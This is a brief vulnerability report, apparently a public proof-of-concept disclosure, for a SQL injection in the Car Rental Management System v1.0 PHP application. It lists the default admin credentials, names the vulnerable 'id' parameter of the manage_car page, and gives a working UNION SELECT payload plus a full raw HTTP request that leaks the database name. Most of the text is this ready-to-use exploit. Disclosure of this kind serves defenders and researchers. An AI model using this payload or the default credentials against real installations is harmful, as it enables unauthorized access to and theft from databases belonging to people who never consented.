# Car Rental Management System v1.0 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.campcodes.com/projects/php/car-rental-management-system/

Vulnerability File: /car-rental-management-system/admin/index.php?page=manage_car&id=

Vulnerability location: /car-rental-management-system/admin/index.php?page=manage_car&id=,id

[+] Payload: /car-rental-management-system/admin/index.php?page=manage_car&id=-6%20union%20select%201,2,database(),4,5,6,7,8,9,10--+ // Leak place ---> id

Current database name: car_rental_db

```sql
GET /car-rental-management-system/admin/index.php?page=manage_car&id=-6%20union%20select%201,2,database(),4,5,6,7,8,9,10--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=q0aiu0hqk51vrl4kivubc7u18k
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/170961356-22451c2e-c1b2-400f-9db0-fc98e70a47b5.png)

![image](https://user-images.githubusercontent.com/54017627/170961396-4a092ea7-e4bd-4311-8c88-30d9b43f488e.png)
